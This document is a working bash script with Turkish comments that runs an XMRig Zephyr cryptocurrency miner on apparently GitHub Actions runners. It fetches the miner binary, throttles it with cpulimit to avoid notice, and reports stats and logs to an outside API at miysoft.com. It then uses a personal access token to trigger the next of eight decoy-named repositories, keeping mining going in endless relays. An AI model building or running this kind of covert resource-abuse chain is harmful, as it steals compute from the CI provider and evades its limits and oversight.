#!/bin/bash
set -x # Hata ayıklama modu

# --- KİMLİK VE AYARLAR ---
# GitHub Actions'dan gelen ID yoksa varsayılan 1 olsun
CURRENT_ID=${WORKER_ID:-1} 
WORKER_NAME="PRIME_W_$CURRENT_ID"
API_URL="https://miysoft.com/miner/prime_api.php"
WALLET="ZEPHYR2TBwvbmFP2MY3pryctzUs68jPieU18FyZQvXkvDdzeJdxtoty7Bkqa1JPcgWd6mejpmV6MeRWB26NQZYB6cjUSVvH8kyo2B"
POOL="de.zephyr.herominers.com:1123"

# GitHub Kullanıcı Adın
GITHUB_USER="tosunhalil924-lang"
# Repoların Sıralı Listesi (Diziler 0'dan başlar, ID-1 yapacağız)
REPOS=("Atlas-Core-System" "Helios-Data-Stream" "Icarus-Sync-Node" "Hermes-Relay-Point" "Ares-Flow-Control" "Zeus-Buffer-Cloud" "Apollo-Logic-Vault" "Athena-Task-Manager")

echo "### SİSTEM BAŞLATILIYOR: ID $CURRENT_ID ###"

# --- ADIM 1: HAZIRLIK ---
sudo apt-get update > /dev/null 2>&1
sudo apt-get install -y wget tar curl jq cpulimit openssl > /dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=128

if [ ! -f "./xmrig" ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
    tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
    mv xmrig-6.22.2/xmrig .
    chmod +x xmrig
fi

# Rastgele Oturum ID'si
RAND_ID=$(openssl rand -hex 4)
MY_MINER_NAME="GHA_${CURRENT_ID}_${RAND_ID}"
touch miner.log && chmod 666 miner.log

# --- ADIM 2: MADENCİLİK BAŞLAT ---
echo "🚀 Madenci Ateşleniyor..."
sudo nohup ./xmrig -o $POOL -u $WALLET -p $MY_MINER_NAME -a rx/0 -t 2 --coin zephyr --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
MINER_PID=$!
sleep 10
sudo cpulimit -p $MINER_PID -l 140 & > /dev/null 2>&1

# --- ADIM 3: İZLEME VE RAPORLAMA (5 Saat 45 Dakika) ---
# 20700 saniye = 5 saat 45 dakika (Çakışma payı için biraz arttırdım)
START_LOOP=$SECONDS
while [ $((SECONDS - START_LOOP)) -lt 20700 ]; do
    
    # Süreç kontrolü
    if ! ps -p $MINER_PID > /dev/null; then
        sudo nohup ./xmrig -o $POOL -u $WALLET -p $MY_MINER_NAME -a rx/0 -t 2 --coin zephyr --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
        MINER_PID=$!
        sudo cpulimit -p $MINER_PID -l 140 &
    fi

    # Veri Toplama
    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    LOGS_B64=$(tail -n 15 miner.log | base64 -w 0)

    # JSON Paketleme
    JSON_DATA=$(jq -n \
                  --arg wid "$WORKER_NAME" \
                  --arg cpu "$CPU" \
                  --arg ram "$RAM" \
                  --arg st "MINING_ZEPH" \
                  --arg log "$LOGS_B64" \
                  '{worker_id: $wid, cpu: $cpu, ram: $ram, status: $st, logs: $log}')

    # API'ye Gönder
    curl -s -o /dev/null -X POST \
         -H "Content-Type: application/json" \
         -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "$JSON_DATA" \
         $API_URL
    
    sleep 60
done

# --- ADIM 4: GÖREV DEVRİ (TRIGGER) ---
echo "✅ Vardiya Bitti. Madenci durduruluyor..."
sudo kill $MINER_PID

# Zincir Mantığı (Chain Logic)
# 1 -> 3 -> 5 -> 7 -> 1
# 2 -> 4 -> 6 -> 8 -> 2
NEXT_ID=$((CURRENT_ID + 2))

# Eğer 8'i geçerse başa sar (Modüler aritmetik yerine basit if)
if [ "$NEXT_ID" -gt 8 ]; then
    NEXT_ID=$((NEXT_ID - 8))
fi

# Hedef Repo İsmini Bul (Dizi indexi 0 olduğu için -1 yapıyoruz)
TARGET_REPO=${REPOS[$((NEXT_ID-1))]}

echo "🔄 Tetiklenen Yeni İşçi: ID $NEXT_ID -> Repo: $TARGET_REPO"

curl -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     "https://api.github.com/repos/$GITHUB_USER/$TARGET_REPO/dispatches" \
     -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$NEXT_ID\"}}"

echo "👋 Çıkış yapılıyor."
exit 0
